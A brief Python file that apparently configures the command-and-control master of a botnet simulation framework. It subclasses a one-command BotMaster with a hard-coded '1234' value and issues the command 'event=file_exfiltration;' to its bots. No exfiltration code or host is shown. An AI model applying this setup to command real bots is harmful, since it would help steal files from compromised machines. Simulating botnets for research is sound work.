import core.BotMaster
from config import botmaster_desc

# class BotMaster(core.BotMaster.BotMasterManInput):
#     def __init__(self, desc=botmaster_desc):
#         core.BotMaster.BotMasterManInput.__init__(self, desc)

from core.BotMaster import BotMasterOneCMD
class BotMaster(BotMasterOneCMD):
    def __init__(self, desc=botmaster_desc):
        BotMasterOneCMD.__init__(self, desc,
            '1234',
            2,
            1,
            # 10,
            'event=file_exfiltration;')
